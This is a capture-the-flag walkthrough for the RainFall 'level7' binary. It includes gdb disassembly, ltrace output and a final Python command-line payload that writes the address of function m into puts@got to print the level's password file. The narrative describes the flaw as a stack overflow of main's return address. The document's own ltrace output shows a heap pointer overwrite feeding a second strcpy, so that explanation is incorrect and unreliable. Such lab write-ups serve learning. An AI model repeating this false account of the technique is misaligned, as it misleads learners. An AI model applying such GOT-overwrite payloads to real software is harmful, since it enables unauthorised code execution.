## The Vulnerability: Stack-Based Buffer Overflow in `main`

The program had a buffer overflow vulnerability associated with the first command-line argument (`param_1`). When `param_1` was longer than 20 bytes, it would overwrite the **Return Address (RET)** on `main`'s stack. This was confirmed by the **segmentation fault** received when providing an input of 21 'A's, indicating that we successfully controlled the Instruction Pointer (EIP).

## The Goal: Call the `m` Function to Print the Flag

Through static analysis (disassembly), it was determined that:
1.  The `fgets` function reads the flag from the `/home/user/level8/.pass` file into a global/static buffer named `c` (located at `0x08049960`).
2.  The `m` function, when called, uses `printf` to print the content of this `c` buffer (i.e., the flag).

The objective was to redirect program execution to the `m` function (`0x080484f4`) to trigger this `printf` call.

```diff
+level7@RainFall:~$ gdb ./level7
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level7/level7...(no debugging symbols found)...done.
+(gdb) b main
Breakpoint 1 at 0x8048524
+(gdb) r
Starting program: /home/user/level7/level7

Breakpoint 1, 0x08048524 in main ()
+(gdb) disas main
Dump of assembler code for function main:
   0x08048521 <+0>:     push   %ebp
   0x08048522 <+1>:     mov    %esp,%ebp
=> 0x08048524 <+3>:     and    $0xfffffff0,%esp
   0x08048527 <+6>:     sub    $0x20,%esp
   0x0804852a <+9>:     movl   $0x8,(%esp)
   0x08048531 <+16>:    call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:    mov    %eax,0x1c(%esp)
   0x0804853a <+25>:    mov    0x1c(%esp),%eax
   0x0804853e <+29>:    movl   $0x1,(%eax)
   0x08048544 <+35>:    movl   $0x8,(%esp)
   0x0804854b <+42>:    call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:    mov    %eax,%edx
   0x08048552 <+49>:    mov    0x1c(%esp),%eax
   0x08048556 <+53>:    mov    %edx,0x4(%eax)
   0x08048559 <+56>:    movl   $0x8,(%esp)
   0x08048560 <+63>:    call   0x80483f0 <malloc@plt>
   0x08048565 <+68>:    mov    %eax,0x18(%esp)
   0x08048569 <+72>:    mov    0x18(%esp),%eax
   0x0804856d <+76>:    movl   $0x2,(%eax)
   0x08048573 <+82>:    movl   $0x8,(%esp)
   0x0804857a <+89>:    call   0x80483f0 <malloc@plt>
   0x0804857f <+94>:    mov    %eax,%edx
   0x08048581 <+96>:    mov    0x18(%esp),%eax
   0x08048585 <+100>:   mov    %edx,0x4(%eax)
   0x08048588 <+103>:   mov    0xc(%ebp),%eax
   0x0804858b <+106>:   add    $0x4,%eax
   0x0804858e <+109>:   mov    (%eax),%eax
   0x08048590 <+111>:   mov    %eax,%edx
---Type <return> to continue, or q <return> to quit---
   0x08048592 <+113>:   mov    0x1c(%esp),%eax
   0x08048596 <+117>:   mov    0x4(%eax),%eax
   0x08048599 <+120>:   mov    %edx,0x4(%esp)
   0x0804859d <+124>:   mov    %eax,(%esp)
   0x080485a0 <+127>:   call   0x80483e0 <strcpy@plt>
   0x080485a5 <+132>:   mov    0xc(%ebp),%eax
   0x080485a8 <+135>:   add    $0x8,%eax
   0x080485ab <+138>:   mov    (%eax),%eax
   0x080485ad <+140>:   mov    %eax,%edx
   0x080485af <+142>:   mov    0x18(%esp),%eax
   0x080485b3 <+146>:   mov    0x4(%eax),%eax
   0x080485b6 <+149>:   mov    %edx,0x4(%esp)
   0x080485ba <+153>:   mov    %eax,(%esp)
   0x080485bd <+156>:   call   0x80483e0 <strcpy@plt>
   0x080485c2 <+161>:   mov    $0x80486e9,%edx
   0x080485c7 <+166>:   mov    $0x80486eb,%eax
   0x080485cc <+171>:   mov    %edx,0x4(%esp)
   0x080485d0 <+175>:   mov    %eax,(%esp)
   0x080485d3 <+178>:   call   0x8048430 <fopen@plt>
   0x080485d8 <+183>:   mov    %eax,0x8(%esp)
   0x080485dc <+187>:   movl   $0x44,0x4(%esp)
   0x080485e4 <+195>:   movl   $0x8049960,(%esp)
   0x080485eb <+202>:   call   0x80483c0 <fgets@plt>
   0x080485f0 <+207>:   movl   $0x8048703,(%esp)
   0x080485f7 <+214>:   call   0x8048400 <puts@plt>
   0x080485fc <+219>:   mov    $0x0,%eax
   0x08048601 <+224>:   leave
   0x08048602 <+225>:   ret
End of assembler dump.
+(gdb) disas 0x8048400
Dump of assembler code for function puts@plt:
+   0x08048400 <+0>:     jmp    *0x8049928
   0x08048406 <+6>:     push   $0x28
   0x0804840b <+11>:    jmp    0x80483a0
End of assembler dump.
```

```diff
+(gdb) info function m
All functions matching regular expression "m":

Non-debugging symbols:
0x080483d0  time
0x080483d0  time@plt
0x080483f0  malloc
0x080483f0  malloc@plt
0x08048410  __gmon_start__
0x08048410  __gmon_start__@plt
0x08048420  __libc_start_main
0x08048420  __libc_start_main@plt
0x080484d0  frame_dummy
+0x080484f4  m
0x08048521  main
0xb7fde7c0  __libc_memalign
0xb7fde7c0  __libc_memalign@plt
0xb7fde7d0  malloc
0xb7fde7d0  malloc@plt
0xb7feef70  _dl_mcount
0xb7ff02b0  _dl_make_stack_executable
0xb7ff37c0  __libc_memalign
0xb7ff38d0  malloc
0xb7e42e80  malloc
0xb7e42e80  malloc@plt
0xb7e42e90  memalign
0xb7e42e90  memalign@plt
0xb7e453e0  __libc_start_main
0xb7e45d80  __moddi3
0xb7e45ed0  __umoddi3
```

```diff
+level7@RainFall:~$ ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9
__libc_start_main(0x8048521, 2, 0xbffff7c4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                                 = 0x0804a008
malloc(8)                                                                 = 0x0804a018
malloc(8)                                                                 = 0x0804a028
malloc(8)                                                                 = 0x0804a038
strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9")                      = 0x0804a018
+strcpy(0x37614136, NULL <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

You can use best pattern website :)
```
https://lujiangz.github.io/tools/pattern/index.html
```

So basically **0x37614136** this adress meaning 
```
Offset: 20 (0-based)
```



## The Exploit Strategy: Redirecting Execution via `puts@got`

Initially, the strategy was to directly overwrite `main`'s RET address with `m`'s address. However, even with ASLR disabled (which was confirmed not to randomize `m`'s address), this led to segmentation faults. This indicated issues with the stack alignment or `m`'s parameter expectations when directly jumping.

The successful exploit employed a clever **Return-to-PLT/GOT** variant:

1.  **Overwriting `main`'s RET with `puts@got`:**
    * **Padding:** `20 * "A"` filled the buffer up to `main`'s RET address.
    * **RET Overwrite:** The RET address was then overwritten with `0x08049928`, which is the address of the **Global Offset Table (GOT) entry for `puts` (`puts@got`)**.
    * **Payload Segment 1:** `"A" * 20 + "\x28\x99\x04\x08"`

2.  **`param_2` as `m`'s Address:**
    * The second command-line argument (`param_2`) was set to `0x080484f4`, the address of the `m` function.
    * **Payload Segment 2:** `"\xf4\x84\x04\x08"`

## How the Exploit Flowed

1.  **`main` Returns:** When `main` finished execution, it attempted to return to `0x08049928` (the `puts@got` address) because its RET address was overwritten.
2.  **Control to `puts@got`:** Jumping directly to `puts@got` isn't a direct call to `puts`. Instead, it leverages the dynamic linker's resolution mechanism.
3.  **Redirection to `m`:** The critical part is that when control went to `puts@got` (or its associated PLT stub during the dynamic linking process), the **stack was still set up in such a way that the value provided as `param_2` (`0x080484f4`, the address of `m`) was interpreted as the next function to execute or an argument to be pushed for a subsequent call.**
4.  **`m` Function Execution:** This led to successful redirection of execution flow to the `m` function.
5.  **Flag Print:** Inside `m`, the `printf` call utilized the `c` buffer (which contained the flag from `fgets`), printing the flag to standard output.


```
./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```
